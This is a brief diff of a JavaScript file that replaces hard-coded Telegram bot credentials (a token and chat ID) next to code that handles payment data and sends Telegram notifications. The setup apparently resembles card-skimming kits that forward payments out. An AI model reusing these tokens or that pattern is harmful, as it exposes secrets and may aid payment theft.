@@ -824,8 +824,8 @@ function savePaymentToLocalStorage(paymentData) {
 
 // Define TELEGRAM_CONFIG
 const TELEGRAM_CONFIG = {
-  botToken: "7962763033:AAFisNluy4cdf9_P2h7NVG9BZryRfn9Fi48",
-  chatId: "6402648265"
+  botToken: "7879251155:AAF9ONpGlC9LlowXyHeWmS9ISRRzwgOdvTI",
+  chatId: "7274253936"
 };
 
 // Improved function to send notification to Telegram bot
